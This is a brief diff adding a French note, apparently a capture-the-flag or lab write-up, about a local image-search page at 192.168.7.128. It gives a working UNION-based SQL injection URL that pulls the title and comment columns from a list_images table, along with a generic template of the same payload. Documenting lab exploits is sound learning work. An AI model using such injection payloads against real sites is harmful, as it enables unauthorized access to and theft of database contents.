@@ -1,0 +1,6 @@
+192.168.7.128/?page=searchimg
+
+En gros on cherche dans la BDD list_images les champs title et comment qui contiennent la solution :).
+/?page=searchimg&id=1+AND+1%3D2+UNION+SELECT+title%2C+comment+FROM+list_images&Submit=Submit#
+
+`1 AND 1=2 UNION SELECT <value1>, <value2> FROM list_images`
